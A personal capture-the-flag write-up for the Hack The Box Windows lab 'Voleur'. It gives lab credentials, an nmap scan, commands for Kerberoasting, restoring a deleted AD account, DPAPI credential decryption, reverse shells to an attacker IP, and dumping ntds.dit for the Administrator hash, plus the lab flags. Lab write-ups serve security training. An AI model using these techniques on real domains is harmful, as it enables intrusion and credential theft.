# 10.129.39.50
- `ryan.naylor:HollowOct31Nyt`
- `svc_ldap:M1XyC9pW7qT5Vn`
- `svc_iis:N5pXyW1VqM7CZ8`
- `svc_winrm:AFireInsidedeOzarctica980219afi`
- `todd.wolfe:NightT1meP1dg3on14`
- `jeremy.combs:qT3V9pLXyN7W4m`
- dc.voleur.htb

## NMAP 
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-17 22:34:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42403930d6fc449537e19b880ba2d771 (RSA)
|   256 aed9c2b87d656f58c8f4ae4fe4e8cd94 (ECDSA)
|_  256 53ad6b6ccaae1b404471529529b1bbc1 (ED25519)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
57620/tcp open  msrpc         Microsoft Windows RPC
57626/tcp open  msrpc         Microsoft Windows RPC
57638/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```

## Foothold
- add dc.voleur.htb voleur.htb voleur to `/etc/hosts`
- `nxc smb dc.voleur.htb -u 'voleur.htb\ryan.naylor' -p 'HollowOct31Nyt' --shares`
- `impacket-smbclient -k -no-pass dc.voleur.htb`
- get `Access_Review.xlsx`
    - `office2john Access_review.xlsx`
    - cracking with john - `football1`
```
Ryan.Naylor	First-Line Support Technician	SMB	Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
Marie.Bryant	First-Line Support Technician	SMB	
Lacey.Miller	Second-Line Support Technician	Remote Management Users	
Todd.Wolfe	Second-Line Support Technician	Remote Management Users	Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
Jeremy.Combs	Third-Line Support Technician	Remote Management Users.	Has access to Software folder.
Administrator	Administrator	Domain Admin	Not to be used for daily tasks!
			
			
Service Accounts			
svc_backup	 	Windows Backup	Speak to Jeremy!
svc_ldap		LDAP Services	P/W - M1XyC9pW7qT5Vn
svc_iis		IIS Administration	P/W - N5pXyW1VqM7CZ8
svc_winrm		Remote Management 	Need to ask Lacey as she reset this recently.
```
- `svc_ldap:M1XyC9pW7qT5Vn`
- `svc_iis:N5pXyW1VqM7CZ8`
- ran bloodhound on ryan
    - svc_ldap has generic_write over lacey.miller
- trying to kerberoast lacey.millers account
- `impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.129.39.50`
    - `export KRB5CCNAME=/home/kali/hack/HTB/machines/windows/voleur/svc_ldap.ccache`
- `python3 targetedKerberoast.py -d voleur.htb --dc-ip 10.129.39.50 -u svc_ldap@voleur.htb -k --dc-host dc`
    - provides 2 SPNs
    ```
    [+] Printing hash for (lacey.miller)
    $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$5a9ab0ff446
    [+] Printing hash for (svc_winrm)
    $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$ee6a0211756b6522e853b
    ```
- running `john` on above hashes gives - `AFireInsidedeOzarctica980219afi`
- running nxc on `svc_winrm:AFireInsidedeOzarctica980219afi` works.
- Follow `Using evil-winrm with kerberos -k` in Obsidian
    - get the tgt
    - set the realm in htb.conf
    - `evil-winrm -i dc.voleur.htb -r voleur.htb`
- get user.txt - bab930c53215ffcf5c9dda25c53f472f

## Privesc
- we see that svc_ldap is a part of `Restore Users` and `todd.wolfe` was a deleted user we have the password to

**UNNECCESSARY 2 steps**
- upload and get a meterpreter shell as svc_winrm
- drop in the shell and try to `runascs` 
<br>

- Run in 
- `.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.14.183:8888`
- enable 'Todd Wolfe'
    - `Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd*"' -IncludeDeletedObjects -Properties * | Select-Object Name, ObjectGUID, LastKnownParent`
        - gives `1c6b1deb-c372-4cbb-87b1-15031de169db`
    - `Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"`
- trying to login as Todd.wolfe
    - `.\RunasCs.exe todd.wolfe NightT1meP1dg3on14 cmd.exe -r 10.10.14.183:8888`
- enum as `Todd.Wolfe`
    - normal folder has nothing
    - part of second-line technicians with lacey - `S-1-5-21-3927696377-1337352550-2781715495-1113`
    - checking `IT/Second-Line Support` with cmd.exe and `dir /a`
    - we see nothing interesting in the normal folders
    - we find a credentials file in `AppData/Roaming/Microsoft/Credentials` named `772275FAD58525253490A9B0039791D3`
        - found a master key for that file in `AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110` named `08949382-134f-4c63-b93c-ce52efc0aa88`
    - sending these files to our attackbox using smbclient
- `impacket-getTGT voleur.htb/todd.wolfe -dc-ip 10.129.39.50`
- `impacket-smbclient -k -no-pass 'dc.voleur.htb'`
- DPAPI credential decryption
    - `impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14`
        - provides the decrupted key
    - `impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83`
    ```
    Username    : jeremy.combs
    Unknown     : qT3V9pLXyN7W4m
    ```
- `.\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m powershell -r 10.10.14.183:8888`
    - checking `IT/Third-Line Support` we see an id_rsa for backup ops
    - copy the id_rsa file and chmod
- we can try spraying the users.
- `cat id_rsa | grep -v '\----' | base64 -d | strings` 
    - we see svc_backup
    - `ssh -i id_rsa svc_backup@dc.voleur.htb -p 2222`
- here we can see the C directory in `/mnt/c`
    - in `/IT/Third-Line Support/Backups/Active Directory` and `/registry` folders, we can find the SECURITY SYSTEM ntds.dit files.
    - send them to our attackbox
- `impacket-secretsdump -system SYSTEM -security SECURITY local -ntds ntds.dit`
    - Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
- `impacket-getTGT voleur.htb/Administrator -dc-ip 10.129.39.50 -hashes :e656e07c56d831611b577b160b259ad2`
    - saves the ccache ticket.
    - `export KRB5CCNAME=/home/kali/hack/HTB/machines/windows/voleur/Administrator.ccache`
    - `impacket-smbclient -k -no-pass 'dc.voleur.htb'`
    - `use C$` to get root.txt - 491637b3b8caa247ed0f9e6d6f34a714
